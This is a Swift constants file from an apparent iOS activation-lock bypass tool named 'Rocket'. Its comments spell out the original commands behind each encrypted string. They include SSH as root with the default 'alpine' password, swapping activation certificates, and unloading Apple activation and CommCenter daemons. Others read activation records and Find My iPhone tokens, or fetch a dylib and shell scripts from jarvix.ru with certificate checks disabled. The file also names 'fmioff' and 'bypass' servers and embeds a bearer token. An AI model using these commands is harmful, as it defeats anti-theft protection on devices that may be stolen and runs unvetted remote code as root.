//
//  Stockholm.swift
//  Rocket
//
//  Created by Abraham Rubio on 30/07/20.
//  Copyright © 2020 sfish. All rights reserved.
//

import Foundation

struct Constants {
    
    /* HTTP_BEARER*/
    static let HTTP_BEARER: String = "AwEhyZuK6DbK8g7LtWtACv42wwZmku2P1ebnamu1x28S50ziGCKDL/ltdbrNlqMIHRJ0eB7DLTTyD31v4EjMEdUpItOkmwY6HhFCCttdkvOaqL9dnQhnwPKz2O/kcA9fdgglmY7spWPN0xgnjEEKIZob"
    
    /* LOGGING LEVEL */
    static let LGN_LVL: String = "DEBUG"
    
    /*Original [/usr/local/bin/sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 ]*/
    static let SHELL_SSH: String = "AwEl3fTLh8L9YfMUcCobZcAP6VRD4Yj4v0xnqhfoPoog0XqGLVNHnnwKyK7ad6WYTEH5ihnbIK9NteYQZXBMwi5hMedgZ5amYZ7ny3lUdGUb7vLMLRC26F30GzW7gtmu+goSxFZTCRrWh1tneK8jIIydRphr6fVk2iOkOyb40547u2nTGzKH9KBhBy4W6kWzy3P/G8QEMHemNCyeulJuaDY3"
    
    /*Orignal [/usr/local/bin/sshpass -p alpine scp -P 2222 -o StrictHostKeyChecking=no ]*/
    static let SHELL_CP: String = "AwGZIeWXa+0YbS2inQw4v7uKYf8Qs5YXfXxA7YTnBipKP3MYfcJ0ejx/ebHYUzEycD3PiY7tB4lBTy/Xtp06rbZURbwyar/CIZAT34rY9mkjz9eEmA+vQjwlWuVyJTppmAtjdXjFfRRhTW9qJJloW0PFzyMg8OoXnZoxBTzUehDnWqSf4koeUH2c4W/2aCvqwls="
    
    /*Original [wget -q --no-check-certificate https://jarvix.ru/active/act/devices/iPhone/]*/
    static let WET: String = "AwG/1c/tQ3bK3vQeoXoHgn8wcJI2cqLz1EKP4R5eGmsxGCXkITzktwkFdwFOwGHfGOWSx3COkReomd05MunnWwarO/1P5Xzil4Sl2nMkM1foEg1uZtITr+FcHAQdUIYk+6sGQC0l3tO3vNnwjFPbWv3+eJF+3OjIjRPrE7hNcb5kZGle3oKJ3OCU1JAn1KSyCAY="

    /*Original [cp /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/FactoryActivation.pem /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem]*/
    static let CP_PEM: String = "AwHA3sDZyXHMOdO0DktfS0aMoPDGDfVCQYuMTAaIEuSjKJzciQi+W8Etz9s8UzFMLPkodMeOFawPAGCjwpk71twyN9czhOEJucmS24p479uGmjGkBsvZO3DAPoN60z6dJJfrkXJNYu+u//g3jWP3nLuFWAi4srMUFvijfgJi4TswbE4qM3fq1n4F5DIndEUVRokEZ9OfSbqzzsB6LI447kfC/fEJ2CdprZ6CMUAQ/GnTCIUHbbvQpkUJwoiQYT82K9Tc40fKDBQJHObuDRQT6h5XEgd0QdGGt7hPzLQT0BkQ9SodukuOdgdzLJfX2yUrSy34WWAFxU3Z4y9qQ0usi4+d376RJ4xABiadb1SWtghU4D2UPGBI7yc4TJgEDR2mJME="
    
    /*Original [https://jarvix.ru/active/act/activatedevice.php]*/
    static let ACT_SRV: String = "AwEFQnvMEDto++eFY7jk43ddZ/gmCgsw0mzVbwmw+/V9szOqZbDSflJAa7l7QBAIK2wbYH52L5yTZGF7PMPRY/gVeSs5ZRbpY1LV5bNejrH+8dnarVxx9+iR44AhnYBZfwGvIjtFvigmkKLc6IOJ3FiY"
    
    /*Original [https://jarvix.ru/active/act/verification.php]*/
    static let VER_SRV: String = "AwG1SvIR2dUSlyK0y+s0YWHQkBSdBtV7I//WBjzhKEXsqpXfYp2cFjNf91qB88nsBj9vOgp1Zu7QTAeBB1o5v+ATDJesLVV7/tMgLBK7/u/0p2P3I5OXNj5iWpTOPeA+XuYwkbd7WY01Pw7yvOVQTMfg"
    
    /*Original 1 [killall iproxy]*/
    static let KLL_PR: String = "AwH1yYb3IYQjOexwArB+K3hVyrHyeTDnIRNzJ7iIbU5YaL0Zrp4uJ9tTYEWfBXBpzrL3c/3UHuxfD8qxAkYXrn1myPNu4FY6zLcW/TA4hAolhw=="
    
    /*Original 2 [killall mitmweb]*/
    static let KLL_MW: String = "AwE+zYIQU7TmExCTyjdBpEd7nzwxL27/s8r2+h1jRdQyTbouh14Ux64ZJeCnAY7EPmcgQaEvXoSzwrmTvwA3FcGHcnbm4FRkShFWYRS77Qq+4w=="

    /*Original 3 [killall mitmproxy]*/
    static let KLL_MP: String = "AwFTtnRW5ToLBO0F4axTaP8heb+ivvK3+fWiLaGP/IJkwy1xvPofk7vODb2Dni6/vo/ZNFSJEQbcBM7L2k3wUHh2FvPaJmf8YWr+00bo7NxztZmzCPXEO/Al+IPU/p/NIHM="
    
    /*Original 4 [killall JavaApplicationStub]*/
    static let KLL_BRP: String = "AwHYIfgesNRvETcHveYt1Lfx+LPx3EX7SgX9M3SxnL14cbyyMLH3+se5vIWYwA6p+nPY83s7+Zz9YlaeoqJ+JHZ6JQbGX5Hz6SQ82qK7q96pB8Ak7RHPZWQj5TtAkITmoj0="

    
    /*Original [chmod +x /usr/bin/]*/
    static let CHX_BN: String = "AwE9fJMV4LDDynKDaCgnZOT+CLLSilg9bl0Dg4VcKyQTMFQdNooYnyzXXJgofbu/trk4GfGLNmQqo2U+GDBA5O/JSeZfZ0WXN5Ur2BXwfXsPeNYqf1uAojMXCJkl5GiDmzs="
    
    /*Original [chmod 755 /usr/bin/]*/
    static let CH7_BN: String = "AwEuQzh9YyPJvc2ERv3054E1b437RjL6LwvJjbWSP0eFgaZib7QCm0DgeoAW9Z70YUvtd346ZWsYQ9eZiOELpH8G2CT3xD6ymhYdZOOYe8bhevt/Izdovb3Dq7Cw9PJTf0M="
    
    /*Original [chmod +x /usr/lib/]*/
    static let CHX_LB: String = "AwGXFPJgZLEM7JkGczXku8ztOp+jMfzw056Qznp7SmYy2fXCMbKAVx3rncKTGI1oAPVz2v8ljrsRpTP/PLI/vnztg8xVqZA67uG3kNKNUqprYLaYul/e0Jj2dgeg/2gP+To="
    
    /*Original [chmod 755 /usr/lib/]*/
    static let CH7_LB: String = "AwGehM0g1d1Q2e9JtZEDGmXVStQOsvj7C8FmPN7ldbbhucTRF1pl7H8yxA5uneJMtk1/H6kSWwcw83IFMxD4g5cxALxQSq84z/x3QoRtz1PzexD9/Br2H/+lfrTQvhy46Is="
    
    /*Original [find /private/var/containers/Data/System -name data_ark.plist]*/
    static let FND_ARK: String = "AwHvCfLQl+FvQZSypy1+zh7YrtHRDVd4dPxfqpt/GDVrE1KL1vci+dD7sKbxnD9pptCkV0x/vuy0aHkg7SOGKOxSTaEXcQHJTG7c1S72fEQaUaSfZ1pQ2kq4VV9kmwl87WLtORzYExwUMJRi38vVDiuNdIaAETJXIpv0aQwtOlfJNQ=="
    
    /*Original [find /private/var/containers/Data/System -name activation_record.plist]*/
    static let FND_ACT_REC: String = "AwGGy+cWLElxJGQSx3Vhzo577PNBmsSTfHiPN4hPs195G3+UiF1QuZqzvNV3acD8LTAL540aRI+h8h5FsaChDHfDGu4DMxceUPnLbCKAVV5X8KCKX0acyM+Xe9z1IZbpxTDkaai3koi4rHMZQMHrllc0Wqt8jFN4s84ruvoUXvrUoz+xQYODsOdS9fNP2uNRAKs="
    
    /*Original [/activation_records/activation_record.plist]*/
    static let ACT_PLS: String = "AwF1oNW19hR9el/VDAVM6+EKkRA6IfIDqHBvh4G6FLomH6YY0yKzqiMGTA0AD9H7PR+gOWCzDRYHSesWt6I95KImEPzmtGFSrsXi4VrAw/vkCoU9ngF2PERzsKUQXWrdBm3NuarJseDyKsiczmOtLFU2"
    
    /*Original [/activation_records]*/
    static let ACT_REC_FOL: String = "AwFvD9cav1XYbGbBAsTkcFtQdFp+3WQ05xbqbueoyq0L1gM/OU5SljMkM8CvM6mOmNuHfCYN9Zuy/lXhyVHY3RoFNTwj3o0F73YIesUT5cdstdbSdf98MPc4wMBbXglDkNY="
    
    /* TRANSICION TO NEW SERVER */
    
    /* Original [https://sw0rdf1sh.mx/verification.php]*/
    static let SRV_VER: String = "AwEHKC1/XnxyRRbJEw1/CPFspgIpziI3MO2SjS9VUJ3CKKBGyWcyQYYUWm0snAcoVyKKbSASNU7/3MOm5OWVVEbr3r6++ZmuseQRgapQKzcKE9ifRea6+8DbSVUnIn8uHpJhrX9YDxbowkDFmYSbm1Ml"
    
    /* Original [https://jarvix.ru/active/w94ujz9b/da9om8re.php]*/
    static let SRV_ACT: String = "AwEp4/GEUiRkjsrKmyS2VB4QgG6Oy4fgGczj6iLg+C9VyL/84K5JS+J2QG7JTw8qPzCeezI6Sie9rNPBzK7ULI3KbbR12alS/3+u+oI0UvoB7H/exuII0yNCvPYZdAXRIMz9XVnHodf6sRY2o9V6YYwW"
    
    /* Original [https://jarvix.ru/active/w94ujz9b/d530gc7n/i27pgcce/]*/
    static let SRV_SER_INE: String = "AwE5v7LublyFw5lVr79yzNSZKpOnmAv+kkUEv43od3jUnLQFtJjx+tld2HqEk/imkWFiPJw+ya7s3inhvlPDMIrDFVA4ccjGP/WrYYQii3WO+g9utWb7cmljDvHr/xMNxnRCKU5rXBDw9+EPS4aqP7Nsat/xOvxGafcRTropKNxqeQ=="
    
    /* Original [https://jarvix.ru/active/w94ujz9b/d530gc7n/i0d9gf4d/]*/
    static let SRV_SER_IAD: String = "AwFkeH8DJ2c4iMBmjcKxPw9ZxqqXAka1flaIFyCc68pzz/7VxSMTEkK10dalgMXI3IZ0jqW3X25XHkcYUCKCS5bI3OOGw5CQRS6CuQAekC71uvodFSKXk/rTqTRlPJifZHksqwI5b+TtpX5Z3VDE0OFYg0A6zrDnCEzCqRlYkZwi+w=="
    
    /* Original [chmod 777 /Library/MobileSubstrate/DynamicLibraries/rocket.*]*/
    static let CHM_777_RCK: String = "AwFjDDL0ZrWCri0lyfEdo8LjpwlICb/DRi77btK3dGEZRGfan3ha7Ks65Hr3bXM7R6gQ+NQY/v2Z5Ou2e0OiQtWru2VMn9XsUYIfMg2kiLFiduFnCGB9ct3VBxh/nMpxHdW35UjBSoH5hxjHE7UH3BjskDkx42WlJ9PD82uemeqUhQ=="
    
    /* Original [chmod +x /Library/MobileSubstrate/DynamicLibraries/rocket.*]*/
    static let CHM_MSX_RCK: String = "AwEhM7qC2rI2PIbCaWHN+0YjIN+W7JhaH4x86Qp0cyTsOsYWj/4ZbMtbVQhDAAKf0cZLwDGSYW552NAd0ijRboN7wHKGKR0P5Q0o3DQvXfKW86QoKROJ/8o2ZyE6eptiLlbsX9sJ88qtshoE9WfavmqaN6UcD4Xjall3XB0rVNKg1w=="
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/reslibs/rocket.dylib -O /Library/MobileSubstrate/DynamicLibraries/rocket.dylib] */
    static let WGT_RCK_DLB: String = "AwGPYJ0oh0ZkyZJ1k6vppuRTfNvop5nqXAp0pL+MydXhHGRVcWWPDhB+viXz12lwQSuYWq7UleDKxz5YCSTaR3tYB4zPl8+Hwc7cSm0bwP+bmcolwEVwmY3FNmyHl95mB4N8ARdcKMj+Q51Xx72xDPLOHVzTfHOnvrnzAKPOSe8XS7q6I/XqUxX+P4LG01UuiZMLPpjEX8qzUWCnN368ifDa+ZZARXbi3qlHYD6GYNHopU8iH9WQ3zRH2CoqvsPl7mwIxCtr/KimlAY0gwCPqNTJ"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/reslibs/rocket.plist -O /Library/MobileSubstrate/DynamicLibraries/rocket.plist] */
    static let WGT_RCK_PLST: String = "AwFXigVdY0uVhW/eiWAfzsos8NeXcoqEnogzsucbAJ/X+1osZtWalfh8A4D0fCq/xO75rKCf3w4OGTsbz6clSSaNeLUkts9Jtp+yf6C345+Wb7V05rSoyIuZp0GiHH4mxy1FHyIreW4r/X87f04wM/2gaWN5hfsXtSk879SVk19TQp7nV18j0MWWAOVZQ0sUQeS9p1ZIQLSM8kL1CQDFLg9H8hlLzE8GD/Tk8tJLdsweXzE7VqrlZ2HB59nmaplyf/2xzXXAND9gCW2mbCpY8NZV"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/reslibs/reload.sh -O /tmp/reload.sh] */
    static let WGT_RLAD_SH: String = "AwH7krrfHsBfjlGBv5wzKflR8bfxgVE/u1tfDEkepyFg6Ek07OV66p96ZGP49sxwPRoGJq/mvws+xOuZSs5NLNwMhDWwH9FL3FfoEGbNRyUk3G09HsR4h4qOl/H3WVuL37ysqILRxokQaBV3OaLLx8XSm6KAi4ECyW14ofvRw+esAoxXSSzavwdE7HKtFH0uLUDV6GfBKn6bAm7jiOb68VuikUSOA+XFnhQZUrHeQSofog=="
    
    /* Original [launchctl unload /System/Library/LaunchDaemons/com.apple.CommCenter.plist] */
    static let UNLOAD_COMM: String = "AwGTShpO6wxRYcVNa0/WsH64v+JBXwWHfB4qTSLN8rLLEcpwl+cLrtPam5Udqns60QJpDpBMAARprVHnzEYznH/fTKeN7DSxbTIztiN1rgY1g9SEprUIc5EIShNwptXWqXNlqwfpnVNuZ9R3r7M9/RkB0RbejUyqJwfE9+fhafnqEUOc+WsGrpgE+EfNzNRQsHw="
    
    /* Original [launchctl load /System/Library/LaunchDaemons/com.apple.CommCenter.plist] */
    static let LOAD_COMM: String = "AwGo+p/8wfxP56sQ++Q+8D5GlSmbYuKamar0hCmYviBUYzJaPhlJ+hyWQ89f+ctYAKgFxMcZgXPbzca939otP9ekZBYWKGOWuPPmz99O9E5sPHfjBa0foq2WFPcgdq783pCMRd3tRahwxEVaO8zZwFP804v9HECIYlA6kCUJqz/wbOoqt7FAhw7kaEoqyADoOvQ="
    
    /* Original [launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist] */
    static let UNLOAD_MAD: String = "AwEFYw+NPOyHgCmElCR/4R4VxGlQSrkKdsQ/5YqgnipsLPFadqjJE86UaA/two7nBqaY2vwg71By4N2ZIgByvaZ74feDgj82rO0nKZXhQ/nrzFq3JXhqGO0e5lmoRFMwIVLAk4G303BAWOulljfYkN1ZvUcC/mZjI/l1V+1AMhYNpBtOAgx5ZneQ/BmSwDxVyiD/HqNQF5/oBqYEFs4xD5f9"
    
    /* Original [launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist] */
    static let LOAD_MAD: String = "AwG8EUkMGLfu2dATR0Bc3ZBBMlgK6Q0HuuZmsKQr37gELRHVO3p8zqUWOjIIPxg1LKD9evIOvlQ6wsOJaTRKq67nwCbXflTGkctu8/JjBJEGGaCBmjcXG3Qr7VPii4ddBoJAzUZhGygPJAv2jdQG3SJOGnQDbZlDCrWRAATkqSfJZkWs5zog5qBglgj+B1OsIhU="
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/d530gc7n/i27pgcce/] */
    static let WGT_INE_SRL: String = "AwE/q2XvJTSF7QuUvg6mcNF9Gv5BfdZG8AjZZDzM6XTqXvWo0QUrxSx1E+ZVH4dMAQ6M21C23Z4MV/6m+8ZWZIjb70/BRht1vrkLmJLN1SffSjEo2ZZyGmH4tbscqW/U9hnE7wvBLRtGFcboFYzFoopikUxK2WONt3uMR1/3/8ddaDFHulr//WL0KF4USYlolvCEUznF1FLSxZHRrwIUsLFk"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/d530gc7n/i0d9gf4d/] */
    static let WGT_IAD_SRL: String = "AwHhVnZ/kBXxYonVqZoetnb6nan4ayLye/7gLZhHdP6QjNDCuJgrkoDSiRBjysBDh5wT93+9+1L7tl38hNiPf61pCvJ7Fvn4RSiPb6Tifcl8LNHDICBVelmFim7nvI7xiZ9NzeFm1UOwsiOcNWwXaFAM36HGAonYDla9hkMiTsOSHNMozwSLxI0cwlHkZrPdXNlfY/6Klotu8iksa58csth5"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/d530gc7n/i1e0hgod/] */
    static let WGT_IOD_SRL: String = "AwHEDCT+k3OvU+rdVpFGcviMX3ANmCKVYRbqKjQTEK9jQ2/ymnL3wCRshgyx4o6+3Hi06xutKJ1x9UCGqfeScUZM+enrhYXW4SaWJp/wVfNfznlyErMHqqFTUVQvxGYIAZ+p2EmfL9VIDH0zwin3jQptNYFRRXKyNPHogBBtUcXr8ojMYZe4dxFv87AR6CCXvqSh649phK6QpQV/DEDvoEa5"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/reslibs/party.tar.gz -O ] */
    static let WGT_PRY_OFF: String = "AwHUWc/zuKBtipjY1D+D+7kEcs7928oe8qjyxjF7bv+y3vnqxsjWvRX2/sbdBgL6EQosS7GufSvjv0h8JQeFaxTykMeCD1Q3WQ7psq/WyWuvScAYoqXZrG82op62BLzwkxjDmzp8v7OES+lGe+A8S63W0sGRXfMR4CqdlWKHcEi2YdUuPA+3IWLn6HR9aQoYSuvlH//CAnuuAN8RQ2B63T4V"
    
    /* Original [/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist] */
    static let NO_BCK_PL: String = "AwH7n0CoNOVwvIZNDF24IwJVNMKPHb4/6nVg7fD+0PqtWVn+nIBLVQ8BQkvseCq6OiAIKF479gxzbUPe3Z+pB7K8q7Z7xF935/Falk2m4SgjEK+6L21U90W0XJI4a4VdQPn6swnFl42vk6YOEFsGI9HtPytC3PaGg6FTxVTjC1kDGjV1/KtCS82XNXxmnx1n71FiJxq28Im7d8p2fHeItVGE"
    
    /* Original [mount -o rw,union,update /] */
    static let MOUNT: String = "AwGSNmSYVa0BHgd67TcAyYf9w1NJePaNMUbwqswNBYCd11nQpF40NeTGWm7WQipWeeQ/4zapiUKdan4kzJ1CdnSs1y8Uj9JSu64OneVhcrojXAYGkdwFRxoI66We3c2FO3k="
    
    /* Original [clean -command da7e6b6d2c20eb316c093] */
    static let CLEAN_BIN: String = "AwE5a2qhjF8qPDv7oq06HBCKISZEOM8gCa1TnUFJugDpEV2xHlO2DhbAwT0p6bFMaNQVTY80TUhAdM5LQM0M9CKpCpTeSbIdIxTdPQS7EeIGl/70wJw2mzFnfnuJ7Kamb0789n+b25iu2zMoHR7lQfJX"
    
    /* Original [com.apple.commcenter.device_specific_nobackup.plist] */
    static let COMM_CEN_PL: String = "AwFACJ+FpzzMTeV3Y9RbRw+CQw1ZIBqIZd3VEqTW6tHb2AZKjB4Vthjl+WQHGppNAxUBoELEoBZtOdqq9RTgEzYLYlHPLCNp2gYjxksqIuoC49yFWFdtTWrZla/dO2tuIGbWyjoKb8EplHnSjmB48j7dv3ozeu8mhn+rOu3VvCYNjg=="
    
    /* Original [activation_record.plist] */
    static let ACT_REC_PL: String = "AwEJK6w0WtM/zI/qbgOt5SBnVS3/s8eAaH5L4wSe9toEL+UY+IE/rnJdN881nChjwFD+b1RtMi5bwv6obxg50ozRrDf6ldUQ/U0cfvNZvyc+aey3W0nI4wpbPwFkNRBwMMw="
    
    /* Original [data_ark.plist] */
    static let DAT_ARK_PL: String = "AwHsHx6gZU2sNgzlT83oLNbWc6xvrwnu8qrsPc3w8zpNknF3LSo1M8rK+f2r/QI3Zt1/r3EoVlb34EDTGIScYJbKpspm9nTrKtwEXIO5NAfhBA=="
    
    /* Original [/private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv] */
    static let IT_IC_INF_PTH: String = "AwGHEJoI6lwZy7qe8bTwTlbYkdKrPg0gX4Qmv7UrgDx0KXOjD8QOaCK9IbK135J0x3X3R5hia7CEQCkyw6KLnwuWZBP8n3nkT1x/aWSChKiz+hcGXKI2qQh1+5L6edVdUVAW0Jc6uO41+DhQVcGhI+uKMdSO6iQqSClrqC4n4akdkqOzm2GfjH585OUJm7xTM/c="
    
    /* Original [IC-Info.sisv] */
    static let IT_IC_INF: String = "AwGooC7290XavIDmIwvhGXNhp52K+zznxdX/ZPhYcXXDsB3zxFABr+3p4mm3UYd5oR1u0fJAKgICyHK2kGQyWWfQXMpM0QoQczTn78dRxcGNgw=="
    
    /* Original [https://sw0rdf1sh.mx/bypasscode/verification.php] */
    static let SRV_VR_BYPC: String = "AwFeKMTWlvv9n4iGjVQZkz8cgYmODiLwQLvW5JbDPEcouyahaCt2LvU6rAqlY04qj1PGSZnu14qf54YabQJox9E4KL8mxjPfGw/GlOoRxNdTzB/nYr167KuZv+hnEf/2gDKzSKB4aS4ai/G0CNJvDxCMJ35WND2Udm19dp1vfjfyew=="
    
    /* Original [https://sw0rdf1sh.mx/fmioff/verification.php] */
    static let SRV_VR_FMI: String = "AwEK0Si987uDam1NB9Fk2GeMLvNo3VmjECQ0Iz7feATZyYdl+FG7YwPc0ZnWCnEY0YieL8u7NImr7KVtDic0ZRSm/9kHzj1fr6vaC/xAfnxFvSxFLGhDCLBYwW5zT6YOq9BoqVfrbcSz1YI1wDc5KYfV"
    
    /* Original [mkdir -p /var/mobile/Library/FairPlay/iTunes_Control/iTunes/] */
    static let MKD_ITNS: String = "AwFN8p5Gxme+CKTp08TyW57dbSvVixP3wOHWs8q9Bkml8kcHlFGolEGa4V3eacb1zOHB4fzMnv/Vftdj+YQZYj4jz1u2N4Ld1JVxprJZaavVW4Sm9SdnQXNQuTHcp3SAvyYLqZJFwdftRSu9IC9ZDY7Y3nE5o1XMTEaZSdByOuqlOg=="
    
    /* Original [com.apple.account.DeviceLocator.find-my-iphone-app-token] */
    static let DEV_LOC_TOK: String = "AwFe4D43s+FnwWnW/zQmU7fPpgGkI8JwmUkeW4TME4Q586+1cqXqiLHyKQzOeZ2GOM5sXoGGPOUFrRf65ZN9pUd+LECfn88ByX1DchlSGP3i/nbumMszSpHTzP+I+np3BGefR9mELa3gaFTMOAnzFEOAiAgbYBdiX3V4IuWCtfBc7w=="
    
    /* Original [/binpack/usr/local/bin/jlutil /var/mobile/Library/Preferences/com.apple.icloud.findmydeviced.FMIPAccounts.plist] */
    static let FMI_ACC: String = "AwHZJ6bM0fWavKc6EwyDJcO0nyFeLhKTb/rYsuaplnljS4ZGUGqSrfUm/E3sXsabyEvHLo9DYJodRMbnZScRyXjwn3mACgfV15K2ZLBULenkxGsgglB0w4Tm7wPP1navcEQIaoXawUVdHfh1aaVTDP/TvMDfbw/eAK9I/C32sTedmS8Oh8zLsOloYD13eufa/LUJ9G30VL6wWn+uQwmHt5mMbfSmSOTOfxB07C7KT3gKPA=="
    
    /* Original [https://jarvix.ru/active/act/freeUntethered.php] */
    static let SRV_ACT_FREE: String = "AwHW2dhST2estDfLbFq90k5Uim0Lii+Clyolo2O373ntlPHCCu9fWKMyLkAdlv8Kszzz61HyF6uJ18jCqM9SVGOq5cSevUp8CXRkbv2ZRXqSLj6slgixIwU/KICPHGxuvsC6wJz81u4gihJAG6oU/tS3"
    
    /* Original [https://jarvix.ru/active/act/devices/freeunt/] */
    static let SRV_ACT_FREE_PATH: String = "AwE0dwAU0y/dp6o5vgMiqPTWZgeD7rN5L4uM0U/LjnKYwGm3ZLpQ+UJ6nioc+2aMV9AE17Qnt2uljal7RdG/6rXYdJgWaoMkLjk+93LHsvIl7QGrzyZrb4CrcUd04iHA6t8VUgqQ7NcylqZb3ubhTSen"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/act/devices/freeunt/] */
    static let WGT_FREE_ACT_REC: String = "AwEEAX1fkSj+rmf4CJAbk1wKeejJiKDKRYY7lSEbVIsUGslssij48sRnx/SH4Jb2ipsQ0mptTPJPmYzMSMKnEMOlW3CCcIZ6sUBN7PA/pcRycvtH51O4OABDC0i2oBhlORFoIkwM7tnCFvWSUQoucpJHl/JeX98bODEKV5mdVxOE+Gdw1EkLWzkw70gjmT6I0gw="
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/act/reslib/alert.sh -O /tmp/alert.sh] */
    static let WGT_RES_ALR_SH: String = "AwH8AUycymCxejoN4Duk21U3M0aemCAqRtd8Aj2WqGFVq6rOcbE9atN2jMZlYg2D0gn2kZxNgK/+vl4XSUEvhITVSGbDQCdz5i2fbQWERJEUdI4bBOS8j0tIvXjAx0WGqjTECBVcTh34iA6JMS89xNhQmmLxs+piOtfeoUHGb3Ir+RlXYf6GJcyvzGEM6FrGhDDrxcZbBn8YG59EgRzE4hb1"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/act/reslib/bbticket.der] */
    static let WGT_RES_BBT: String = "AwGZaSakzwE6jQIBd4xUtfkMWNYcz+CsaN0XbW/aUhfm7biSmD9PRx4xjb/WdcVX+r+eTFxeaxNc97G2AkTDjjXCfzk6IEnGul1nvnu9ynyYuTmWylFmvj3EL8HtMymbIYL85wnt7/EBnoHtwQikHm2/LTC7B9FCFT7T4svuxJG2Nkuohw9MJxO7aKfcq1P5DKk="
    
    /* Original [find /usr/local/standalone/firmware/Baseband -name bbticket.der] */
       static let FND_BBT: String = "AwHy2ugNMwvU673QF77VaU8UGqXu8Rw4UsqI+3JlzURK6EqDW6sQALHQ5Yr4EB9b5RJOTtkpraIs2kM7AK+XJ+6mSy29wKpJ9uaHtng2uqXtTfFPYwDsFL9XPQcDCYVW7hySB2Zj3u0jJ5KaysvN2DQYttHcnLmDwYnUDcv6xDU67w=="
    
    /* Original [/System/Library/PrivateFrameworks/SystemStatusServer.framework] */
    static let SYS_STS_SRV: String = "AwGEntI6bxg94ypWysSuUVehRS7BVCChvDNeXORRxn/PUUFKfHxrCcqF99Fq/cYtaEWnwz/W5SLdf8VPnqvP90ib9TY+rbnDY/4x+LM650pHjnCQJ7BKvt0xHYzlhNSgimftCL9ttb7oYug9qMCWTRADqA9pB8dM1fPoddNuQVNKaw=="
    
    /* Original [SystemStatusServer.strings] */
    static let SYS_STS_SRV_STR: String = "AwELCJ0NTeK4pH3tKccthn3Rr8iN+CgBJNiHISIGjjrH9JsJBHMhkDvIJS3SFztCmMsgq97bQASmVlFb+jYXh7qW9q+fHWylicg9mXHkKKfSa2Ov0QfXOsyteCGXJY2NBaE="
    
    /* Original [https://sw0rdf1sh.mx/fmioff/offservice.php] */
    static let SRV_FMI_OFF_SVC: String = "AwF7a1mjd/RkMh4hUVFyFprHH2fUkiBh1o2cBzfRRR9LYxD7a0ALmMwOxPiF5HPP0qaKpwYCStRI2tQPlmBEDmooodvcBR/a/euDZOoP/RN2Ct0Abx2kKuPSN9I2KOOv3dldEWJl2VJz7dreJEssk14x"
    
    /* Original [https://sw0rdf1sh.mx/meid/verification.php] */
    static let SRV_VRF_MEID: String = "AwGYt8GmtF1G0wKsRcwQv8diFLdswgk+rzlXn0QMm3d7Cyl6tMfQjrDODOTdj25yQpKEIfj5mR4Hj7ht4qfgI4xxsn6aQ8PEa6LUsLT+WWLnVUOJiI4hohV9T2mTAuREjxQm20h2NyPSNN/a4dEwS/pG"
    
    /* Original [https://imadcydia.com/roger/regsn.php] */
    static let SRV_REG_MEID: String = "AwGuzdWBiu2fdGwgvUIOINj0qghARbZN4X+CI2OUdimUXccS6LVAfFODC6eMghwwLp7anOBjVZoq/ghSAliTyhzUdgGPhOZYQ869dEU+bm8BpqyuRa3KdS2aOSuvFFjbijdYRNKfr7CUt6AmPnlbi2mp"
    
    /* Original [http://api.ibypass.live/by/ic/afc.php] */
    static let SRV_ACT_MEID_SVC: String = "AwGAah2mO7xgHJVzlGP0B/QQg6qnvYbDb9JGbGrc75BS+ARhnUkSRmjvr5/a6Vqvy9VIqFT+vyWbLVeNYeUdPdAOFr42/XA0pJRlHSB3A8c2mRekbk0mYFBMFDku159GyTa2334lVk0Fq8OEfhLzsaeP"
    
    /* Original [https://jarvix.ru/active/w94ujz9b/me9qw8id.php] */
    static let SRV_ACT_MEID: String = "AwH6vLEptF0jI2kbqx8fmk58q4h77PKNqq1QGvorOLICKfK8+2Y29Ny3JdaGxl41IlaRwV3t6id1Yvl1y9+/7/WEUiarJKJKe9rRbo5pDmLwbfCRUQ4OJMObCPBN5ffJk8RziJLqKPocIcPtxX8ZtZXS"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/me86id35ces/i27pg6ne/] */
    static let WGT_INE_MEID: String = "AwGMluw3z6QIQC5BOOmKiODp/ugpB12X8wfh59h/Apk7V4vIb03RdxYyZXrVq5a5toRheKs31bZE/9TMsB/Gv1ilZoT7t+uF7KgwvMgl9+pudANxYid8kNyjSWPOor4lTLtdZfq/CFtB7sOKv60bD7xFj/qlORcd1JisWRNeMwDyyZdjfEi7o9I2/m9JaCg4IxzY1DkFjzonSG92mz7WAb2/"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/me86id35ces/i0d9gf4d/] */
    static let WGT_IAD_MEID: String = "AwFN7A49yjrXTTmfjrnML7PHsesBKs+MtJ2WgKej6UdN9UuFlX5nSgnY9H8GlwwmYj4W4MZHQmdUOLFTOufEWLrnlZXM+cCOBnGYEqOc7gh1LkOXSAYFpXLfi52CrVdSivkD6lT4hfQukz59D4y0Tglzx8/CjzDc4/hDHM7zENzUjFci/TLbb+tN0BbT+rQPd4k8X7g8DgfoWSTpVlAMMXUu"
    
    /* Original [wget -q --no-check-certificate https://jarvix.ru/active/w94ujz9b/me86id35ces/i1e9hg0d/] */
    static let WGT_IOD_MEID: String = "AwFFDfT/6LzXkJOdKTh0RKbPLOV/h3WhpyUh9MUgvGxzwgsdBqeN+E7cdHVx9qaV7L26mTCtjx8qH/T7xU/LapugH0k9mgC52Atfk1xinAUrRNpyQl2EFN/Lmzdl1fIjSn9sQtUiR1PwbWkpf8xCCllPlsXDDvmc5ZaLQzfaObQls7coe/flZdH+gwlVeABehgV/PjmSCxKhSV/Oeu+JdkOS"
}
